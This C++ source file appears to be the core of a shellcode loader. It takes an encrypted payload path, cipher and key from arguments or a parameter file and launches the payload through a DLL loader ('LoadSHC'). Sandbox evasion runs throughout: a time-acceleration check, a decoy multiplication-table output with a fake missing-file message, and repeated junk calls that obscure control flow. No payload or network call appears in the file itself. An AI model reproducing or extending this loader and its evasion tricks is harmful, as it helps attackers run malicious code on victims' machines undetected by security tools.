//
// Created by au9u5t on 24-9-30.
//

#include "Core.h"
#include "utils.h"


int Core::start(int argc, char *argv[]) {
    if (this->mode == 0) {
        this->mode0Function();
    } else if (this->mode == 1) {
        this->mode1Function();
    } else if (this->mode == 2) {
        this->mode2Function();
    } else if (this->mode == 3) {
        this->mode3Function();
    } else if (this->mode == 4) {
        this->mode4Function(argc, argv);
    } else {
        std::cout << "Invalid mode" << std::endl;
    }
    return 0;
}

void Core::setMode(int m) {
    this->mode = m;
}

int Core::getMode() {
    return this->mode;
}

void Core::mode1Function() {
    Cryptography::Euclid(10, 5);
}

void Core::mode0Function() {
    std::cout << "DEBUG MODE" << std::endl;
}

void Core::mode3Function() {
    if (util::isTimeAccelerated()) {
        if (!util::DisableEvent()) {
            return;
        }

        std::cout << "No Find main.txt or StringTable ..." << std::endl;

        std::cout << "\n";

        for (int i = 1; i <= 9; ++i) {
            Confusion::generateAndSortArray();

            for (int j = 1; j <= i; ++j) {
                Confusion::generateAndSortArray();

                std::cout << j << " x " << i << " = " << (i * j);
                if (j < i) {
                    Confusion::generateAndSortArray();

                    std::cout << "\t";
                }
            }
            std::cout << std::endl;
        }
    }
}

void Core::mode2Function() {
    Confusion::generateAndSortArray();
}

void Core::mode4Function(int argc, char **argv) {
    Confusion::generateAndSortArray();
    auto selectedMode = this->checkParameter(argc, argv);
//    if (!checkParameter(argc, argv)) {
//        Parameter::printHelp();
//        return;
//    }
    if (Parameter::isPrintHelp(argc, argv)) {
        Parameter::printHelp();
        return;
    }

    Confusion::generateAndSortArray();
//    switch (selectedMode) {
//        case Parameter::LoadSHC: { // used to load application
//            this->option1(argc, argv);
//            break;
//        }
//        default: {
//            this->loadApplication();
//            break;
//        }
//    }
    if (selectedMode == Parameter::LoadSHC) {
        this->option1(argc, argv);
    } else {
        this->loadApplication();
    }
}

int Core::checkParameter(int argc, char **argv) {

//    if (!Parameter::checkParameters(argc, argv)) {
//        return false;
//    }
//    return true;
    return  Parameter::checkParameters(argc, argv);
}

int Core::getOperation(char *argv[]) {
    if (strcmp(argv[1], "1") == 0) {
        return 1;
    } else {
        return 0;
    }
}

void Core::option1(int argc, char **argv) {
    if (!this->analyzeOpt1Parameters(argc, argv)) {
        Parameter::printHelp();
        return;
    }
    Confusion::generateAndSortArray();
    this->launchFunction();
}

void Core::defaultOption(int argc, char **argv) {
    if (util::isTimeAccelerated()) {
        if (!util::DisableEvent()) {
            return;
        }

        std::cout << "No Find main.txt or StringTable ..." << std::endl;

        std::cout << "\n";

        for (int i = 1; i <= 9; ++i) {
            Confusion::generateAndSortArray();

            for (int j = 1; j <= i; ++j) {
                Confusion::generateAndSortArray();

                std::cout << j << " x " << i << " = " << (i * j);
                if (j < i) {
                    Confusion::generateAndSortArray();

                    std::cout << "\t";
                }
            }
            std::cout << std::endl;
        }
    } else {
        Confusion::generateAndSortArray();
    }
}

//void
//Core::initLaunch(std::string &filePath, std::string &method, std::string &key, std::string &function_mode, int cycles) {
//    this->launch = new Launch(filePath, method, key, function_mode);
//    this->launch->setCycles(cycles);
//}
//
//Core::Core(string &filePath, string &method, string &key, string &function_mode, int cycles) {
//    this->initLaunch(filePath, method, key, function_mode, cycles);
//}

bool Core::analyzeOpt1Parameters(int argc, char **argv) {
    this->filePath = argv[2];
    if (!File::isFileExists(this->filePath)) {
        std::cout << "File does not exist!" << std::endl;
        return false;
    }

    this->encryptionMethod = argv[3];
    this->key = argv[4];
    this->functionMode = argv[5];

    return true;
}

void Core::getParameterFromFile(int argc, std::vector<std::string> &argv) {
    std::string parameterFIlePath{"../input/parameter.txt"};
    if (!File::isFileExists(parameterFIlePath)) {
        std::cout << "Parameter file does not exist!" << std::endl;
        std::cout << "Not in ../input/parameter.txt" << std::endl;
        return;
    }
    std::ifstream file(parameterFIlePath, std::ios::binary);
    if (!file.is_open()) {
        std::cout << "Failed to open file" << std::endl;
        return;
    }
//    std::string stringParameters{};
//    stringParameters = {std::istreambuf_iterator < char > (file), std::istreambuf_iterator < char > ()};
    std::string stringParameters((std::istreambuf_iterator<char>(file)),
                                 std::istreambuf_iterator<char>());
    std::string tempParameter{};
    std::vector<std::string> tempParameters = {"main"};
    for (const auto &i: stringParameters) {
        if (i == ' ' && !tempParameter.empty() && tempParameter != "" && tempParameter != " ") {
            tempParameters.emplace_back(tempParameter);
            tempParameter.clear();
        } else if (i != ' ') {
            tempParameter += i;
        }
    }
    tempParameters.push_back(tempParameter);


    for (const auto & item: tempParameters) {
        argv.push_back(item);
    }
    argc = argv.size();
    file.close();

}

void Core::loadApplication() {
    int argc{0};
    std::vector<std::string> argv{};
    this->getParameterFromFile(argc, argv);
    if (!this->analyzeOpt2Parameters(argc, argv)) {
        Parameter::printHelp();
        return;
    }
    Confusion::generateAndSortArray();
    this->launchFunction();

}

bool Core::analyzeOpt2Parameters(int argc, std::vector<std::string> &argv) {
    this->filePath = argv[2];
    if (!File::isFileExists(this->filePath)) {
        std::cout << "File does not exist!" << std::endl;
        return false;
    }

    this->encryptionMethod = argv[3];
    this->key = argv[4];
    this->functionMode = argv[5];

    return true;
}

void Core::launchFunction() {
    Confusion::generateAndSortArray();
//    this->initLaunch(this->filePath, this->encryptionMethod, this->key, this->functionMode, this->cycles);
//    this->launch->au9u5tDecrypt();
    loadLibrary::runLaunchDll(this->filePath, this->encryptionMethod, this->key, this->functionMode, this->cycles);

}

